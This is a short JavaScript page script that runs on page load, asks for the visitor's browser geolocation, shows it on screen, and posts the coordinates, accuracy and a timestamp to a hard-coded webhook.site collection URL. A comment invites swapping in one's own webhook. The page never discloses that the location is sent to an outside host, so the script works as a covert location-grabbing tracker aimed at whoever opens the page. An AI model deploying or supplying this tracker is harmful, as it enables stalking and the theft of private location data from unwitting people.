const statusEl = document.getElementById("status");
const coordsEl = document.getElementById("coords");

// Replace with your unique webhook.site URL
const WEBHOOK_URL = "https://webhook.site/ca1a5565-178c-490f-a556-e7e8f5101310";

function logLocation(lat, lon, acc) {
  statusEl.textContent = "✅ Location access granted";
  coordsEl.textContent = `Lat: ${lat}, Lon: ${lon}, Accuracy: ±${acc}m`;

  // Send data to webhook.site
  fetch(WEBHOOK_URL, {
    method: "POST",
    body: JSON.stringify({
      latitude: lat,
      longitude: lon,
      accuracy: acc,
      timestamp: new Date().toISOString()
    }),
    headers: {
      "Content-Type": "application/json"
    }
  })
    .then((res) => res.text())
    .then((data) => console.log("Logged:", data))
    .catch((err) => console.error("Error:", err));
}

function getLocation() {
  if ("geolocation" in navigator) {
    statusEl.textContent = "📍 Requesting your location...";

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        logLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
      },
      (err) => {
        statusEl.textContent = "❌ Error: " + err.message;
      }
    );
  } else {
    statusEl.textContent = "⚠️ Geolocation not supported.";
  }
}

// 🚀 Auto-run on page load
window.onload = getLocation;

